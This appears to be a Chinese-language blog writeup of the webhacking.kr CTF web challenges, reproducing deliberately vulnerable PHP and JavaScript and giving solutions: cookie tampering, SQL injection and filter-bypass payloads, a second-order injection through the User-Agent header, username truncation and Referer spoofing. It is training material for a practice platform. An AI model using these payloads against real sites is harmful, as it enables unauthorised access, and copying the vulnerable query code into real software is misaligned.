---
title: webhacking.kr writeup
layout: post
categories: CTF
tags: CTF
---

这个 CTF 平台都是 web 题目，感觉不错，这里记录一下做题的一些技巧，持续更新......

<!--more-->

## challenge 1

```php
<?
$password="????";
//如果不是「数字 , .」的话那么就匹配成功, 那么 $_COOKIE[user_lv]=1
if(eregi("[^0-9,.]",$_COOKIE[user_lv])) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>=6) $_COOKIE[user_lv]=1;

if($_COOKIE[user_lv]>5) @solve();

echo("<br>level : $_COOKIE[user_lv]");
?>
```

直接用 `editcookie` 修改 cookie 即可，然后在地址栏回车

## challenge 2

[https://pengyang.me/2018/10/11/webhacking_ch2/](https://pengyang.me/2018/10/11/webhacking_ch2/)

## challenge 3

**tips：**

注意到此时只有右下角那个`5x5` 可以选中，每一行的数字代表要选中多少个空格。

**此时我们可以获得输入框，输入数据之后进行抓包，尝试提交的数据是否存在注入点。(可以发现只要存在输入的地方就想办法测试是否存在注入点。)**

经测试发现这里`--+,#,=,',or,and` 都被过滤了，另想办法构造 payload ` || 1`，得到 `new_sql_injection`。



## challenge 4

一次 base64，两次 sha1 

[解密网站](http://hashtoolkit.com/reverse-hash?hash=a94a8fe5ccb19ba61c4c0873d391e987982fbbd3)

最终结果是 `test`



## challenge 5

这里真是的，直接点击`join` 按钮是不能访问的，需要在地址栏输入完整的路径 `webhacking.kr/challenge/web/web-05/mem/join.php` ，然后我们查看源码可以看到一段 JS 代码:

```javascript
l='a';ll='b';lll='c';llll='d';lllll='e';llllll='f';lllllll='g';llllllll='h';lllllllll='i';llllllllll='j';lllllllllll='k';llllllllllll='l';lllllllllllll='m';llllllllllllll='n';lllllllllllllll='o';llllllllllllllll='p';lllllllllllllllll='q';llllllllllllllllll='r';lllllllllllllllllll='s';llllllllllllllllllll='t';lllllllllllllllllllll='u';llllllllllllllllllllll='v';lllllllllllllllllllllll='w';llllllllllllllllllllllll='x';lllllllllllllllllllllllll='y';llllllllllllllllllllllllll='z';I='1';II='2';III='3';IIII='4';IIIII='5';IIIIII='6';IIIIIII='7';IIIIIIII='8';IIIIIIIII='9';IIIIIIIIII='0';li='.';ii='<';iii='>';lIllIllIllIllIllIllIllIllIllIl=lllllllllllllll+llllllllllll+llll+llllllllllllllllllllllllll+lllllllllllllll+lllllllllllll+ll+lllllllll+lllll;
lIIIIIIIIIIIIIIIIIIl=llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+lll+lllllllllllllll+lllllllllllllll+lllllllllll+lllllllll+lllll;if(eval(lIIIIIIIIIIIIIIIIIIl).indexOf(lIllIllIllIllIllIllIllIllIllIl)==-1) { bye; }if(eval(llll+lllllllllllllll+lll+lllllllllllllllllllll+lllllllllllll+lllll+llllllllllllll+llllllllllllllllllll+li+'U'+'R'+'L').indexOf(lllllllllllll+lllllllllllllll+llll+lllll+'='+I)==-1){alert('access_denied');history.go(-1);}else{document.write('<font size=2 color=white>Join</font><p>');document.write('.<p>.<p>.<p>.<p>.<p>');document.write('<form method=post action='+llllllllll+lllllllllllllll+lllllllll+llllllllllllll+li+llllllllllllllll+llllllll+llllllllllllllll
+'>');document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name='+lllllllll+llll+' maxlength=5></td></tr>');document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name='+llllllllllllllll+lllllllllllllllllllllll+' maxlength=10></td></tr>');document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');}
```

上面代码的主要部分是下面这里：

```javascript
document.write('<font size=2 color=white>Join</font><p>');
document.write('.<p>.<p>.<p>.<p>.<p>');
document.write('<form method=post action="join.php">');
document.write('<table border=1><tr><td><font color=gray>id</font></td><td><input type=text name="id" maxlength=5></td></tr>');
document.write('<tr><td><font color=gray>pass</font></td><td><input type=text name="pw" maxlength=10></td></tr>');
document.write('<tr align=center><td colspan=2><input type=submit></td></tr></form></table>');
```

这道题比较骚的地方就在于隐藏了输入框，需要自己运行 JS 代码。

然后注册`admin+很多空格+1`，密码`123456` 即可，利用数据库的截断。最后登录即可。



## challenge 6

```php
<?php 
if(!$_COOKIE[user]) 
{ 
    $val_id="guest"; 
    $val_pw="123qwe"; 

    for($i=0;$i<20;$i++) 
    { 
        $val_id=base64_encode($val_id); 
        $val_pw=base64_encode($val_pw); 

    } 

    $val_id=str_replace("1","!",$val_id); 
    $val_id=str_replace("2","@",$val_id); 
    $val_id=str_replace("3","$",$val_id); 
    $val_id=str_replace("4","^",$val_id); 
    $val_id=str_replace("5","&",$val_id); 
    $val_id=str_replace("6","*",$val_id); 
    $val_id=str_replace("7","(",$val_id); 
    $val_id=str_replace("8",")",$val_id); 

    $val_pw=str_replace("1","!",$val_pw); 
    $val_pw=str_replace("2","@",$val_pw); 
    $val_pw=str_replace("3","$",$val_pw); 
    $val_pw=str_replace("4","^",$val_pw); 
    $val_pw=str_replace("5","&",$val_pw); 
    $val_pw=str_replace("6","*",$val_pw); 
    $val_pw=str_replace("7","(",$val_pw); 
    $val_pw=str_replace("8",")",$val_pw); 

    Setcookie("user",$val_id); 
    Setcookie("password",$val_pw); 

    echo("<meta http-equiv=refresh content=0>"); 
} 
?> 
```

上面的代码我们可以不运行，直接绕过下面的代码，对 `admin` 进行 base64 编码 20 次。

```php
<? 

$decode_id=$_COOKIE[user]; 
$decode_pw=$_COOKIE[password]; 

$decode_id=str_replace("!","1",$decode_id); 
$decode_id=str_replace("@","2",$decode_id); 
$decode_id=str_replace("$","3",$decode_id); 
$decode_id=str_replace("^","4",$decode_id); 
$decode_id=str_replace("&","5",$decode_id); 
$decode_id=str_replace("*","6",$decode_id); 
$decode_id=str_replace("(","7",$decode_id); 
$decode_id=str_replace(")","8",$decode_id); 

$decode_pw=str_replace("!","1",$decode_pw); 
$decode_pw=str_replace("@","2",$decode_pw); 
$decode_pw=str_replace("$","3",$decode_pw); 
$decode_pw=str_replace("^","4",$decode_pw); 
$decode_pw=str_replace("&","5",$decode_pw); 
$decode_pw=str_replace("*","6",$decode_pw); 
$decode_pw=str_replace("(","7",$decode_pw); 
$decode_pw=str_replace(")","8",$decode_pw); 


for($i=0;$i<20;$i++) 
{ 
    $decode_id=base64_decode($decode_id); 
    $decode_pw=base64_decode($decode_pw); 
} 

echo("<font style=background:silver;color:black>&nbsp;&nbsp;HINT : base64&nbsp;&nbsp;</font><hr><a href=index.phps style=color:yellow;>index.phps</a><br><br>"); 
echo("ID : $decode_id<br>PW : $decode_pw<hr>"); 

if($decode_id=="admin" && $decode_pw=="admin") 
{ 
    @solve(6,100); 
} 
?> 
```

**payload:**

```python
import base64
a = "admin"
for i in xrange(20):
    a=base64.b64encode(a)
print a
```



## challenge 7 ⭐️

**tips:**

```
index.phps
```

```php
<?
$answer = "????";

$go=$_GET[val];

if(!$go) { echo("<meta http-equiv=refresh content=0;url=index.php?val=1>"); }

$ck=$go;

$ck=str_replace("*","",$ck);
$ck=str_replace("/","",$ck);


echo("<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>");


if(eregi("--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|<>|sysM|and|or|table|column",$ck)) exit("Access Denied!");

if(eregi(' ',$ck)) { echo('cannot use space'); exit(); }

$rand=rand(1,5);

if($rand==1)
{
$result=@mysql_query("select lv from lv1 where lv=($go)") or die("nice try!");
}

if($rand==2)
{
$result=@mysql_query("select lv from lv1 where lv=(($go))") or die("nice try!");
}

if($rand==3)
{
$result=@mysql_query("select lv from lv1 where lv=((($go)))") or die("nice try!");
}

if($rand==4)
{
$result=@mysql_query("select lv from lv1 where lv=(((($go))))") or die("nice try!");
}

if($rand==5)
{
$result=@mysql_query("select lv from lv1 where lv=((((($go)))))") or die("nice try!");
}

$data=mysql_fetch_array($result);
if(!$data[0]) { echo("query error"); exit(); }
if($data[0]!=1 && $data[0]!=2) { exit(); }


if($data[0]==1)
{
echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
alert('Access_Denied!')><p>");
echo("<!-- admin mode : val=2 -->");
}

if($data[0]==2)
{
echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
alert('Congratulation')><p>");
@solve();
} 
?>
```

主要注意下面的代码

```php
$ck=str_replace("*","",$ck);
$ck=str_replace("/","",$ck);
.
.
.
if(eregi("--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|<>|sysM|and|or|table|column",$ck)) exit("Access Denied!");
if(eregi(' ',$ck)) { echo('cannot use space'); exit(); }
```

**payload:**

```
http://webhacking.kr/challenge/web/web-07/index.php?val=0)%0au*ni*on%0ase*le*ct%0a(3-1
http://webhacking.kr/challenge/web/web-07/index.php?val=0)%0aunion%select%0a3-1%23
```

以上payload尝试失败遇到mod_security ⭐️



## challenge 8

查看源码

```php
<?

$agent=getenv("HTTP_USER_AGENT");
$ip=$_SERVER[REMOTE_ADDR];

$agent=trim($agent);

$agent=str_replace(".","_",$agent);
$agent=str_replace("/","_",$agent);

$pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";

//这里没有对单引号进行过滤且后面插入的时候会用到
$agent=strtolower($agent);

if(preg_match($pat,$agent)) exit("Access Denied!");

//这里对单引号进行了过滤但是只是在查询的时候用到
$_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);
$_SERVER[HTTP_USER_AGENT]=str_replace("\"","",$_SERVER[HTTP_USER_AGENT]);

$count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
if($count_ck[0]>=70) { @mysql_query("delete from lv0"); }


$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");

$ck=@mysql_fetch_array($q);

if($ck)
{ 
echo("hi <b>$ck[0]</b><p>");
if($ck[0]=="admin")

{
@solve();
@mysql_query("delete from lv0");
}


}

if(!$ck)
{
$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
echo("<br><br>done!  ($count_ck[0]/70)");
}
?>
```

这里考查的是比较基础的二次注入

**payload:**

```
第一次
insert into lv0(agent,ip,id) values('$agent','$ip','guest')
User-Agent: admin','1','admin')#
第二次
User-Agent: admin
```



## challenge 9



## challenge 10

查看源码

```html
<a id=hackme style="position:relative;left:0;top:0" onclick="this.style.posLeft+=1;if(this.style.posLeft==800)this.href='?go='+this.style.posLeft" onmouseover=this.innerHTML='yOu' onmouseout=this.innerHTML='O'>O</a><br>
```

根据 JS 代码，使用下面 URL

```
http://webhacking.kr/challenge/codeing/code1.html?go=800
```

发现并没有什么异常，返回`no hack`

这里有两种方法：

**解法一:**

```
hackme.style.posLeft=799
```

然后点击 `a` 标签

**解法二:**

抓包，然后添加

```
Referer: http://webhacking.kr/challenge/codeing/code1.html
```



## challenge 11

```php
$pat="/[1-3][a-f]{5}_.*194.156.230.212.*\tp\ta\ts\ts/";

if(preg_match($pat,$_GET[val])) { echo("Password is ????"); }
```

基本的正则匹配

payload

```
1aaaaa_11941156123012121	p	a	s	s
\t => %09
```



## challenge 12

**tips:**

进行简单的 JS 解码然后打印出关键信息就 OK了



## challenge 13



## challenge 14

**tips:**

直接看下 JS 代码，打印一下关键信息就可以了


## 参考:

[http://shaobaobaoer.cn/archives/654/hackingweb-kr-81e998aee595](http://shaobaobaoer.cn/archives/654/hackingweb-kr-81e998aee595)<br>
[https://blog.csdn.net/qq_19876131/article/details/51148227](https://blog.csdn.net/qq_19876131/article/details/51148227)